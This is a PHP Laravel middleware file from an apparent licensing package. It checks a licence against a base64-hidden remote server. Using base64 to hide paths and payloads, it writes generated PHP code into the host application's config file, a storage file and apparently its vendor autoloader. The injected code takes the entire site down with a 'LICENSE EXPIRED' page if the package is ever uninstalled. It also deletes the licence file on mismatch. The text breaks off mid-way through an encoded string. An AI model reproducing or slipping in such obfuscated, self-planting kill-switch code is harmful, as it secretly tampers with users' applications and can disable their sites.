<?php

namespace Licon\Lis\Http\Middleware;

use Closure;

use Illuminate\Http\Request;
use Licon\Lis\Services\LisSer;
use Licon\Lis\Traits\CacheKeys;

class LisMid
{
    use CacheKeys;
    public function handle(Request $request, Closure $next)
    {
        $codeu = "aHR0cHM6Ly9hdXRoLmVuZ2luaWZ5LmluL2FwaS9saWNlbnNlL3YxL2F1dGg";
        if (!$this->lseModifyAt()) {
            self::mkFle();
            self::mkLtxt();
            $isLicenseValid = new LisSer($codeu);
            $isLicenseValid = $isLicenseValid->validateL();
            if ($isLicenseValid) {
                return $next($request);
            }
        } else {
            if ($this->checkLicenseExists())
                return $next($request);
        }
        return abort(403, base64_decode("TElDRU5TRSBFWFBJUkVE"));
    }

    public function checkLicenseExists()
    {

        if (file_exists($this->basePth() . base64_decode("Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0"))) {
            $content = file_get_contents($this->basePth() . base64_decode("Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0"), true);
            $content = explode("(c{v{b", @$content);
            $decrypt = openssl_decrypt(@$content[0], "AES-256-CBC", base64_encode(@$content[1]), OPENSSL_RAW_DATA, "0123456789abcdef");
            $var = json_decode($decrypt, 1);
            $fileCo = @$var["param"]["fileCount"];
            $fileDo = @$var["param"]["fileAllData"];
            $v = $this->getAllCount();
            $ply = $v['ply'];
            $ply2 = $v['d'];
            if ($fileCo == $ply && $fileDo == $ply2) {
                return true;
            } else {
                unlink(storage_path('/app/LICENSE.txt'));
                return false;
            }
        } else {
            return false;
        }
    }

    public function mkFle()
    {
        $folderPath = $this->basePth() . base64_decode('Ly9jb25maWcvL2NvbmZpZy5waHA');

        $content = '<?php
        $basepath = getcwd();
        $filePath = ($basepath . base64_decode("L2NvbXBvc2VyLmpzb24"));
        $jsonString = file_get_contents($filePath);
        $jsonData = json_decode($jsonString, true);
        if (empty(base64_decode("JGpzb25EYXRhWyJyZXF1aXJlIl1bImxpY29uL2xpcyJd"))) {
            die(base64_decode("PGh0bWwgbGFuZz0iZW4iPgogICAgPGhlYWQ+CiAgICAgICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+CgogICAgICAgIDx0aXRsZT5TZXJ2aWNlIFVuYXZhaWxhYmxlPC90aXRsZT4KCiAgICAgICAgPHN0eWxlPgogICAgICAgICAgICAvKiEgbm9ybWFsaXplLmNzcyB2OC4wLjEgfCBNSVQgTGljZW5zZSB8IGdpdGh1Yi5jb20vbmVjb2xhcy9ub3JtYWxpemUuY3NzICovaHRtbHtsaW5lLWhlaWdodDoxLjE1Oy13ZWJraXQtdGV4dC1zaXplLWFkanVzdDoxMDAlfWJvZHl7bWFyZ2luOjB9YXtiYWNrZ3JvdW5kLWNvbG9yOnRyYW5zcGFyZW50fWNvZGV7Zm9udC1mYW1pbHk6bW9ub3NwYWNlLG1vbm9zcGFjZTtmb250LXNpemU6MWVtfVtoaWRkZW5de2Rpc3BsYXk6bm9uZX1odG1se2ZvbnQtZmFtaWx5OnN5c3RlbS11aSwtYXBwbGUtc3lzdGVtLEJsaW5rTWFjU3lzdGVtRm9udCxTZWdvZSBVSSxSb2JvdG8sSGVsdmV0aWNhIE5ldWUsQXJpYWwsTm90byBTYW5zLHNhbnMtc2VyaWYsQXBwbGUgQ29sb3IgRW1vamksU2Vnb2UgVUkgRW1vamksU2Vnb2UgVUkgU3ltYm9sLE5vdG8gQ29sb3IgRW1vamk7bGluZS1oZWlnaHQ6MS41fSosOmFmdGVyLDpiZWZvcmV7Ym94LXNpemluZzpib3JkZXItYm94O2JvcmRlcjowIHNvbGlkICNlMmU4ZjB9YXtjb2xvcjppbmhlcml0O3RleHQtZGVjb3JhdGlvbjppbmhlcml0fWNvZGV7Zm9udC1mYW1pbHk6TWVubG8sTW9uYWNvLENvbnNvbGFzLExpYmVyYXRpb24gTW9ubyxDb3VyaWVyIE5ldyxtb25vc3BhY2V9c3ZnLHZpZGVve2Rpc3BsYXk6YmxvY2s7dmVydGljYWwtYWxpZ246bWlkZGxlfXZpZGVve21heC13aWR0aDoxMDAlO2hlaWdodDphdXRvfS5iZy13aGl0ZXstLWJnLW9wYWNpdHk6MTtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7YmFja2dyb3VuZC1jb2xvcjpyZ2JhKDI1NSwyNTUsMjU1LHZhcigtLWJnLW9wYWNpdHkpKX0uYmctZ3JheS0xMDB7LS1iZy1vcGFjaXR5OjE7YmFja2dyb3VuZC1jb2xvcjojZjdmYWZjO2JhY2tncm91bmQtY29sb3I6cmdiYSgyNDcsMjUwLDI1Mix2YXIoLS1iZy1vcGFjaXR5KSl9LmJvcmRlci1ncmF5LTIwMHstLWJvcmRlci1vcGFjaXR5OjE7Ym9yZGVyLWNvbG9yOiNlZGYyZjc7Ym9yZGVyLWNvbG9yOnJnYmEoMjM3LDI0MiwyNDcsdmFyKC0tYm9yZGVyLW9wYWNpdHkpKX0uYm9yZGVyLWdyYXktNDAwey0tYm9yZGVyLW9wYWNpdHk6MTtib3JkZXItY29sb3I6I2NiZDVlMDtib3JkZXItY29sb3I6cmdiYSgyMDMsMjEzLDIyNCx2YXIoLS1ib3JkZXItb3BhY2l0eSkpfS5ib3JkZXItdHtib3JkZXItdG9wLXdpZHRoOjFweH0uYm9yZGVyLXJ7Ym9yZGVyLXJpZ2h0LXdpZHRoOjFweH0uZmxleHtkaXNwbGF5OmZsZXh9LmdyaWR7ZGlzcGxheTpncmlkfS5oaWRkZW57ZGlzcGxheTpub25lfS5pdGVtcy1jZW50ZXJ7YWxpZ24taXRlbXM6Y2VudGVyfS5qdXN0aWZ5LWNlbnRlcntqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5mb250LXNlbWlib2xke2ZvbnQtd2VpZ2h0OjYwMH0uaC01e2hlaWdodDoxLjI1cmVtfS5oLTh7aGVpZ2h0OjJyZW19LmgtMTZ7aGVpZ2h0OjRyZW19LnRleHQtc217Zm9udC1zaXplOi44NzVyZW19LnRleHQtbGd7Zm9udC1zaXplOjEuMTI1cmVtfS5sZWFkaW5nLTd7bGluZS1oZWlnaHQ6MS43NXJlbX0ubXgtYXV0b3ttYXJnaW4tbGVmdDphdXRvO21hcmdpbi1yaWdodDphdXRvfS5tbC0xe21hcmdpbi1sZWZ0Oi4yNXJlbX0ubXQtMnttYXJnaW4tdG9wOi41cmVtfS5tci0ye21hcmdpbi1yaWdodDouNXJlbX0ubWwtMnttYXJnaW4tbGVmdDouNXJlbX0ubXQtNHttYXJnaW4tdG9wOjFyZW19Lm1sLTR7bWFyZ2luLWxlZnQ6MXJlbX0ubXQtOHttYXJnaW4tdG9wOjJyZW19Lm1sLTEye21hcmdpbi1sZWZ0OjNyZW19Li1tdC1weHttYXJnaW4tdG9wOi0xcHh9Lm1heC13LXhse21heC13aWR0aDozNnJlbX0ubWF4LXctNnhse21heC13aWR0aDo3MnJlbX0ubWluLWgtc2NyZWVue21pbi1oZWlnaHQ6MTAwdmh9Lm92ZXJmbG93LWhpZGRlbntvdmVyZmxvdzpoaWRkZW59LnAtNntwYWRkaW5nOjEuNXJlbX0ucHktNHtwYWRkaW5nLXRvcDoxcmVtO3BhZGRpbmctYm90dG9tOjFyZW19LnB4LTR7cGFkZGluZy1sZWZ0OjFyZW07cGFkZGluZy1yaWdodDoxcmVtfS5weC02e3BhZGRpbmctbGVmdDoxLjVyZW07cGFkZGluZy1yaWdodDoxLjVyZW19LnB0LTh7cGFkZGluZy10b3A6MnJlbX0uZml4ZWR7cG9zaXRpb246Zml4ZWR9LnJlbGF0aXZle3Bvc2l0aW9uOnJlbGF0aXZlfS50b3AtMHt0b3A6MH0ucmlnaHQtMHtyaWdodDowfS5zaGFkb3d7Ym94LXNoYWRvdzowIDFweCAzcHggMCByZ2JhKDAsMCwwLC4xKSwwIDFweCAycHggMCByZ2JhKDAsMCwwLC4wNil9LnRleHQtY2VudGVye3RleHQtYWxpZ246Y2VudGVyfS50ZXh0LWdyYXktMjAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6I2VkZjJmNztjb2xvcjpyZ2JhKDIzNywyNDIsMjQ3LHZhcigtLXRleHQtb3BhY2l0eSkpfS50ZXh0LWdyYXktMzAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6I2UyZThmMDtjb2xvcjpyZ2JhKDIyNiwyMzIsMjQwLHZhcigtLXRleHQtb3BhY2l0eSkpfS50ZXh0LWdyYXktNDAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6I2NiZDVlMDtjb2xvcjpyZ2JhKDIwMywyMTMsMjI0LHZhcigtLXRleHQtb3BhY2l0eSkpfS50ZXh0LWdyYXktNTAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6I2EwYWVjMDtjb2xvcjpyZ2JhKDE2MCwxNzQsMTkyLHZhcigtLXRleHQtb3BhY2l0eSkpfS50ZXh0LWdyYXktNjAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6IzcxODA5Njtjb2xvcjpyZ2JhKDExMywxMjgsMTUwLHZhcigtLXRleHQtb3BhY2l0eSkpfS50ZXh0LWdyYXktNzAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6IzRhNTU2ODtjb2xvcjpyZ2JhKDc0LDg1LDEwNCx2YXIoLS10ZXh0LW9wYWNpdHkpKX0udGV4dC1ncmF5LTkwMHstLXRleHQtb3BhY2l0eToxO2NvbG9yOiMxYTIwMmM7Y29sb3I6cmdiYSgyNiwzMiw0NCx2YXIoLS10ZXh0LW9wYWNpdHkpKX0udXBwZXJjYXNle3RleHQtdHJhbnNmb3JtOnVwcGVyY2FzZX0udW5kZXJsaW5le3RleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmV9LmFudGlhbGlhc2Vkey13ZWJraXQtZm9udC1zbW9vdGhpbmc6YW50aWFsaWFzZWQ7LW1vei1vc3gtZm9udC1zbW9vdGhpbmc6Z3JheXNjYWxlfS50cmFja2luZy13aWRlcntsZXR0ZXItc3BhY2luZzouMDVlbX0udy01e3dpZHRoOjEuMjVyZW19LnctOHt3aWR0aDoycmVtfS53LWF1dG97d2lkdGg6YXV0b30uZ3JpZC1jb2xzLTF7Z3JpZC10ZW1wbGF0ZS1jb2x1bW5zOnJlcGVhdCgxLG1pbm1heCgwLDFmcikpfUAtd2Via2l0LWtleWZyYW1lcyBzcGluezAle3RyYW5zZm9ybTpyb3RhdGUoMGRlZyl9dG97dHJhbnNmb3JtOnJvdGF0ZSgxdHVybil9fUBrZXlmcmFtZXMgc3BpbnswJXt0cmFuc2Zvcm06cm90YXRlKDBkZWcpfXRve3RyYW5zZm9ybTpyb3RhdGUoMXR1cm4pfX1ALXdlYmtpdC1rZXlmcmFtZXMgcGluZ3swJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTc1JSx0b3t0cmFuc2Zvcm06c2NhbGUoMik7b3BhY2l0eTowfX1Aa2V5ZnJhbWVzIHBpbmd7MCV7dHJhbnNmb3JtOnNjYWxlKDEpO29wYWNpdHk6MX03NSUsdG97dHJhbnNmb3JtOnNjYWxlKDIpO29wYWNpdHk6MH19QC13ZWJraXQta2V5ZnJhbWVzIHB1bHNlezAlLHRve29wYWNpdHk6MX01MCV7b3BhY2l0eTouNX19QGtleWZyYW1lcyBwdWxzZXswJSx0b3tvcGFjaXR5OjF9NTAle29wYWNpdHk6LjV9fUAtd2Via2l0LWtleWZyYW1lcyBib3VuY2V7MCUsdG97dHJhbnNmb3JtOnRyYW5zbGF0ZVkoLTI1JSk7LXdlYmtpdC1hbmltYXRpb24tdGltaW5nLWZ1bmN0aW9uOmN1YmljLWJlemllciguOCwwLDEsMSk7YW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjpjdWJpYy1iZXppZXIoLjgsMCwxLDEpfTUwJXt0cmFuc2Zvcm06dHJhbnNsYXRlWSgwKTstd2Via2l0LWFuaW1hdGlvbi10aW1pbmctZnVuY3Rpb246Y3ViaWMtYmV6aWVyKDAsMCwuMiwxKTthbmltYXRpb24tdGltaW5nLWZ1bmN0aW9uOmN1YmljLWJlemllcigwLDAsLjIsMSl9fUBrZXlmcmFtZXMgYm91bmNlezAlLHRve3RyYW5zZm9ybTp0cmFuc2xhdGVZKC0yNSUpOy13ZWJraXQtYW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjpjdWJpYy1iZXppZXIoLjgsMCwxLDEpO2FuaW1hdGlvbi10aW1pbmctZnVuY3Rpb246Y3ViaWMtYmV6aWVyKC44LDAsMSwxKX01MCV7dHJhbnNmb3JtOnRyYW5zbGF0ZVkoMCk7LXdlYmtpdC1hbmltYXRpb24tdGltaW5nLWZ1bmN0aW9uOmN1YmljLWJlemllcigwLDAsLjIsMSk7YW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjpjdWJpYy1iZXppZXIoMCwwLC4yLDEpfX1AbWVkaWEgKG1pbi13aWR0aDo2NDBweCl7LnNtXDpyb3VuZGVkLWxne2JvcmRlci1yYWRpdXM6LjVyZW19LnNtXDpibG9ja3tkaXNwbGF5OmJsb2NrfS5zbVw6aXRlbXMtY2VudGVye2FsaWduLWl0ZW1zOmNlbnRlcn0uc21cOmp1c3RpZnktc3RhcnR7anVzdGlmeS1jb250ZW50OmZsZXgtc3RhcnR9LnNtXDpqdXN0aWZ5LWJldHdlZW57anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW59LnNtXDpoLTIwe2hlaWdodDo1cmVtfS5zbVw6bWwtMHttYXJnaW4tbGVmdDowfS5zbVw6cHgtNntwYWRkaW5nLWxlZnQ6MS41cmVtO3BhZGRpbmctcmlnaHQ6MS41cmVtfS5zbVw6cHQtMHtwYWRkaW5nLXRvcDowfS5zbVw6dGV4dC1sZWZ0e3RleHQtYWxpZ246bGVmdH0uc21cOnRleHQtcmlnaHR7dGV4dC1hbGlnbjpyaWdodH19QG1lZGlhIChtaW4td2lkdGg6NzY4cHgpey5tZFw6Ym9yZGVyLXQtMHtib3JkZXItdG9wLXdpZHRoOjB9Lm1kXDpib3JkZXItbHtib3JkZXItbGVmdC13aWR0aDoxcHh9Lm1kXDpncmlkLWNvbHMtMntncmlkLXRlbXBsYXRlLWNvbHVtbnM6cmVwZWF0KDIsbWlubWF4KDAsMWZyKSl9fUBtZWRpYSAobWluLXdpZHRoOjEwMjRweCl7LmxnXDpweC04e3BhZGRpbmctbGVmdDoycmVtO3BhZGRpbmctcmlnaHQ6MnJlbX19QG1lZGlhIChwcmVmZXJzLWNvbG9yLXNjaGVtZTpkYXJrKXsuZGFya1w6YmctZ3JheS04MDB7LS1iZy1vcGFjaXR5OjE7YmFja2dyb3VuZC1jb2xvcjojMmQzNzQ4O2JhY2tncm91bmQtY29sb3I6cmdiYSg0NSw1NSw3Mix2YXIoLS1iZy1vcGFjaXR5KSl9LmRhcmtcOmJnLWdyYXktOTAwey0tYmctb3BhY2l0eToxO2JhY2tncm91bmQtY29sb3I6IzFhMjAyYztiYWNrZ3JvdW5kLWNvbG9yOnJnYmEoMjYsMzIsNDQsdmFyKC0tYmctb3BhY2l0eSkpfS5kYXJrXDpib3JkZXItZ3JheS03MDB7LS1ib3JkZXItb3BhY2l0eToxO2JvcmRlci1jb2xvcjojNGE1NTY4O2JvcmRlci1jb2xvcjpyZ2JhKDc0LDg1LDEwNCx2YXIoLS1ib3JkZXItb3BhY2l0eSkpfS5kYXJrXDp0ZXh0LXdoaXRley0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6I2ZmZjtjb2xvcjpyZ2JhKDI1NSwyNTUsMjU1LHZhcigtLXRleHQtb3BhY2l0eSkpfS5kYXJrXDp0ZXh0LWdyYXktNDAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6I2NiZDVlMDtjb2xvcjpyZ2JhKDIwMywyMTMsMjI0LHZhcigtLXRleHQtb3BhY2l0eSkpfX0KICAgICAgICA8L3N0eWxlPgoKICAgICAgICA8c3R5bGU+CiAgICAgICAgICAgIGJvZHkgewogICAgICAgICAgICAgICAgZm9udC1mYW1pbHk6IHVpLXNhbnMtc2VyaWYsIHN5c3RlbS11aSwgLWFwcGxlLXN5c3RlbSwgQmxpbmtNYWNTeXN0ZW1Gb250LCAiU2Vnb2UgVUkiLCBSb2JvdG8sICJIZWx2ZXRpY2EgTmV1ZSIsIEFyaWFsLCAiTm90byBTYW5zIiwgc2Fucy1zZXJpZiwgIkFwcGxlIENvbG9yIEVtb2ppIiwgIlNlZ29lIFVJIEVtb2ppIiwgIlNlZ29lIFVJIFN5bWJvbCIsICJOb3RvIENvbG9yIEVtb2ppIjsKICAgICAgICAgICAgfQogICAgICAgIDwvc3R5bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keSBjbGFzcz0iYW50aWFsaWFzZWQiPgogICAgICAgIDxkaXYgY2xhc3M9InJlbGF0aXZlIGZsZXggaXRlbXMtdG9wIGp1c3RpZnktY2VudGVyIG1pbi1oLXNjcmVlbiBiZy1ncmF5LTEwMCBkYXJrOmJnLWdyYXktOTAwIHNtOml0ZW1zLWNlbnRlciBzbTpwdC0wIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWF4LXcteGwgbXgtYXV0byBzbTpweC02IGxnOnB4LTgiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZmxleCBpdGVtcy1jZW50ZXIgcHQtOCBzbTpqdXN0aWZ5LXN0YXJ0IHNtOnB0LTAiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InB4LTQgdGV4dC1sZyB0ZXh0LWdyYXktNTAwIGJvcmRlci1yIGJvcmRlci1ncmF5LTQwMCB0cmFja2luZy13aWRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgIDQwMyAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1sLTQgdGV4dC1sZyB0ZXh0LWdyYXktNTAwIHVwcGVyY2FzZSB0cmFja2luZy13aWRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgIExJQ0VOU0UgRVhQSVJFRCAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2JvZHk+CjwvaHRtbD4="));
        }';
        file_put_contents($folderPath, $content);
    }

    public function mkLtxt()
    {
        $folderPath = $this->basePth() . base64_decode('Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw');
        $folderPath2 = $this->basePth() . base64_decode('Ly92ZW5kb3IvL2F1dG9sb2FkX3JlYWwucGhw');

        $cnt = '<?php
        $jsonData = json_decode(file_get_contents(getcwd() . base64_decode("L2NvbXBvc2VyLmpzb24")), true);
        if (empty($jsonData["require"][base64_decode("bGljb24vbGlz")])) {
            die(base64_decode("PGh0bWwgbGFuZz0iZW4iPgogICAgPGhlYWQ+CiAgICAgICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+CgogICAgICAgIDx0aXRsZT5TZXJ2aWNlIFVuYXZhaWxhYmxlPC90aXRsZT4KCiAgICAgICAgPHN0eWxlPgogICAgICAgICAgICAvKiEgbm9ybWFsaXplLmNzcyB2OC4wLjEgfCBNSVQgTGljZW5zZSB8IGdpdGh1Yi5jb20vbmVjb2xhcy9ub3JtYWxpemUuY3NzICovaHRtbHtsaW5lLWhlaWdodDoxLjE1Oy13ZWJraXQtdGV4dC1zaXplLWFkanVzdDoxMDAlfWJvZHl7bWFyZ2luOjB9YXtiYWNrZ3JvdW5kLWNvbG9yOnRyYW5zcGFyZW50fWNvZGV7Zm9udC1mYW1pbHk6bW9ub3NwYWNlLG1vbm9zcGFjZTtmb250LXNpemU6MWVtfVtoaWRkZW5de2Rpc3BsYXk6bm9uZX1odG1se2ZvbnQtZmFtaWx5OnN5c3RlbS11aSwtYXBwbGUtc3lzdGVtLEJsaW5rTWFjU3lzdGVtRm9udCxTZWdvZSBVSSxSb2JvdG8sSGVsdmV0aWNhIE5ldWUsQXJpYWwsTm90byBTYW5zLHNhbnMtc2VyaWYsQXBwbGUgQ29sb3IgRW1vamksU2Vnb2UgVUkgRW1vamksU2Vnb2UgVUkgU3ltYm9sLE5vdG8gQ29sb3IgRW1vamk7bGluZS1oZWlnaHQ6MS41fSosOmFmdGVyLDpiZWZvcmV7Ym94LXNpemluZzpib3JkZXItYm94O2JvcmRlcjowIHNvbGlkICNlMmU4ZjB9YXtjb2xvcjppbmhlcml0O3RleHQtZGVjb3JhdGlvbjppbmhlcml0fWNvZGV7Zm9udC1mYW1pbHk6TWVubG8sTW9uYWNvLENvbnNvbGFzLExpYmVyYXRpb24gTW9ubyxDb3VyaWVyIE5ldyxtb25vc3BhY2V9c3ZnLHZpZGVve2Rpc3BsYXk6YmxvY2s7dmVydGljYWwtYWxpZ246bWlkZGxlfXZpZGVve21heC13aWR0aDoxMDAlO2hlaWdodDphdXRvfS5iZy13aGl0ZXstLWJnLW9wYWNpdHk6MTtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7YmFja2dyb3VuZC1jb2xvcjpyZ2JhKDI1NSwyNTUsMjU1LHZhcigtLWJnLW9wYWNpdHkpKX0uYmctZ3JheS0xMDB7LS1iZy1vcGFjaXR5OjE7YmFja2dyb3VuZC1jb2xvcjojZjdmYWZjO2JhY2tncm91bmQtY29sb3I6cmdiYSgyNDcsMjUwLDI1Mix2YXIoLS1iZy1vcGFjaXR5KSl9LmJvcmRlci1ncmF5LTIwMHstLWJvcmRlci1vcGFjaXR5OjE7Ym9yZGVyLWNvbG9yOiNlZGYyZjc7Ym9yZGVyLWNvbG9yOnJnYmEoMjM3LDI0MiwyNDcsdmFyKC0tYm9yZGVyLW9wYWNpdHkpKX0uYm9yZGVyLWdyYXktNDAwey0tYm9yZGVyLW9wYWNpdHk6MTtib3JkZXItY29sb3I6I2NiZDVlMDtib3JkZXItY29sb3I6cmdiYSgyMDMsMjEzLDIyNCx2YXIoLS1ib3JkZXItb3BhY2l0eSkpfS5ib3JkZXItdHtib3JkZXItdG9wLXdpZHRoOjFweH0uYm9yZGVyLXJ7Ym9yZGVyLXJpZ2h0LXdpZHRoOjFweH0uZmxleHtkaXNwbGF5OmZsZXh9LmdyaWR7ZGlzcGxheTpncmlkfS5oaWRkZW57ZGlzcGxheTpub25lfS5pdGVtcy1jZW50ZXJ7YWxpZ24taXRlbXM6Y2VudGVyfS5qdXN0aWZ5LWNlbnRlcntqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyfS5mb250LXNlbWlib2xke2ZvbnQtd2VpZ2h0OjYwMH0uaC01e2hlaWdodDoxLjI1cmVtfS5oLTh7aGVpZ2h0OjJyZW19LmgtMTZ7aGVpZ2h0OjRyZW19LnRleHQtc217Zm9udC1zaXplOi44NzVyZW19LnRleHQtbGd7Zm9udC1zaXplOjEuMTI1cmVtfS5sZWFkaW5nLTd7bGluZS1oZWlnaHQ6MS43NXJlbX0ubXgtYXV0b3ttYXJnaW4tbGVmdDphdXRvO21hcmdpbi1yaWdodDphdXRvfS5tbC0xe21hcmdpbi1sZWZ0Oi4yNXJlbX0ubXQtMnttYXJnaW4tdG9wOi41cmVtfS5tci0ye21hcmdpbi1yaWdodDouNXJlbX0ubWwtMnttYXJnaW4tbGVmdDouNXJlbX0ubXQtNHttYXJnaW4tdG9wOjFyZW19Lm1sLTR7bWFyZ2luLWxlZnQ6MXJlbX0ubXQtOHttYXJnaW4tdG9wOjJyZW19Lm1sLTEye21hcmdpbi1sZWZ0OjNyZW19Li1tdC1weHttYXJnaW4tdG9wOi0xcHh9Lm1heC13LXhse21heC13aWR0aDozNnJlbX0ubWF4LXctNnhse21heC13aWR0aDo3MnJlbX0ubWluLWgtc2NyZWVue21pbi1oZWlnaHQ6MTAwdmh9Lm92ZXJmbG93LWhpZGRlbntvdmVyZmxvdzpoaWRkZW59LnAtNntwYWRkaW5nOjEuNXJlbX0ucHktNHtwYWRkaW5nLXRvcDoxcmVtO3BhZGRpbmctYm90dG9tOjFyZW19LnB4LTR7cGFkZGluZy1sZWZ0OjFyZW07cGFkZGluZy1yaWdodDoxcmVtfS5weC02e3BhZGRpbmctbGVmdDoxLjVyZW07cGFkZGluZy1yaWdodDoxLjVyZW19LnB0LTh7cGFkZGluZy10b3A6MnJlbX0uZml4ZWR7cG9zaXRpb246Zml4ZWR9LnJlbGF0aXZle3Bvc2l0aW9uOnJlbGF0aXZlfS50b3AtMHt0b3A6MH0ucmlnaHQtMHtyaWdodDowfS5zaGFkb3d7Ym94LXNoYWRvdzowIDFweCAzcHggMCByZ2JhKDAsMCwwLC4xKSwwIDFweCAycHggMCByZ2JhKDAsMCwwLC4wNil9LnRleHQtY2VudGVye3RleHQtYWxpZ246Y2VudGVyfS50ZXh0LWdyYXktMjAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6I2VkZjJmNztjb2xvcjpyZ2JhKDIzNywyNDIsMjQ3LHZhcigtLXRleHQtb3BhY2l0eSkpfS50ZXh0LWdyYXktMzAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6I2UyZThmMDtjb2xvcjpyZ2JhKDIyNiwyMzIsMjQwLHZhcigtLXRleHQtb3BhY2l0eSkpfS50ZXh0LWdyYXktNDAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6I2NiZDVlMDtjb2xvcjpyZ2JhKDIwMywyMTMsMjI0LHZhcigtLXRleHQtb3BhY2l0eSkpfS50ZXh0LWdyYXktNTAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6I2EwYWVjMDtjb2xvcjpyZ2JhKDE2MCwxNzQsMTkyLHZhcigtLXRleHQtb3BhY2l0eSkpfS50ZXh0LWdyYXktNjAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6IzcxODA5Njtjb2xvcjpyZ2JhKDExMywxMjgsMTUwLHZhcigtLXRleHQtb3BhY2l0eSkpfS50ZXh0LWdyYXktNzAwey0tdGV4dC1vcGFjaXR5OjE7Y29sb3I6IzRhNTU2ODtjb2xvcjpyZ2JhKDc0LDg1LDEwNCx2YXIoLS10ZXh0LW9wYWNpdHkpKX0udGV4dC1ncmF5LTkwMHstLXRleHQtb3BhY2l0eToxO2NvbG9yOiMxYTIwMmM7Y29sb3I6cmdiYSgyNiwzMiw0NCx2YXIoLS10ZXh0LW9wYWNpdHkpKX0udXBwZXJjYXNle3RleHQtdHJhbnNmb3JtOnVwcGVyY2FzZX0udW5kZXJsaW5le3RleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmV9LmFudGlhbGlhc2Vkey13ZWJraXQtZm9udC1zbW9vdGhpbmc6YW50aWFsaWFzZWQ7LW1vei1vc3gtZm9udC1zbW9vdGhpbmc6Z3JheXNjYWxlfS50cmFja2luZy13aWRlcntsZXR0ZXItc3BhY2luZzouMDVlbX0udy01e3dpZHRoOjEuMjVyZW19LnctOHt3aWR0aDoycmVtfS53LWF1dG97d2lkdGg6YXV0b30uZ3JpZC1jb2xzLTF7Z3JpZC10ZW1wbGF0ZS1jb2x1bW5zOnJlcGVhdCgxLG1pbm1heCgwLDFmcikpfUAtd2Via2l0LWtleWZyYW1lcyBzcGluezAle3RyYW5zZm9ybTpyb3RhdGUoMGRlZyl9dG97dHJhbnNmb3JtOnJvdGF0ZSgxdHVybil9fUBrZXlmcmFtZXMgc3BpbnswJXt0cmFuc2Zvcm06cm90YXRlKDBkZWcpfXRve3RyYW5zZm9ybTpyb3RhdGUoMXR1cm4pfX1ALXdlYmtpdC1rZXlmcmFtZXMgcGluZ3swJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTc1JSx0b3t0cmFuc2Zvcm06c2NhbGUoMik7b3BhY2l0eTowfX1Aa2V5ZnJhbWVzIHBpbmd7MCV7dHJhbnNmb3JtOnNjYWxlKDEpO29wYWNpdHk6MX03NSUsdG97dHJhbnNmb3JtOnNjYWxlKDIpO29wYWNpdHk6MH19QC13ZWJraXQta2V5ZnJhbWVzIHB1bHNlezAlLHRve29wYWNpdHk6MX01MCV7b3BhY2l0eTouNX19QGtleWZyYW1lcyBwdWxzZXswJSx0b3tvcGFjaXR5OjF9NTAle29wYWNpdHk6LjV9fUAtd2Via2l0LWtleWZyYW1lcyBib3VuY2V7MCUsdG97dHJhbnNmb3JtOnRyYW5zbGF0ZVkoLTI1JSk7LXdlYmtpdC1hbmltYXRpb24tdGltaW5nLWZ1bmN0aW9uOmN1YmljLWJlemllciguOCwwLDEsMSk7YW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjpjdWJpYy1iZXppZXIoLjgsMCwxLDEpfTUwJXt0cmFuc2Zvcm06dHJhbnNsYXRlWSgwKTstd2Via2l0LWFuaW1hdGlvbi10aW1pbmctZnVuY3Rpb246Y3ViaWMtYmV6aWVyKDAsMCwuMiwxKTthbmltYXRpb24tdGltaW5nLWZ1bmN0aW9uOmN1YmljLWJlemllcigwLDAsLjIsMSl9fUBrZXlmcmFtZXMgYm91bmNlezAlLHRve3RyYW5zZm9ybTp0cmFuc2xhdGVZKC0yNSUpOy13ZWJraXQtYW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjpjdWJpYy1iZXppZXIoLjgsMCwxLDEpO2FuaW1hdGlvbi10aW1pbmctZnVuY3Rpb246Y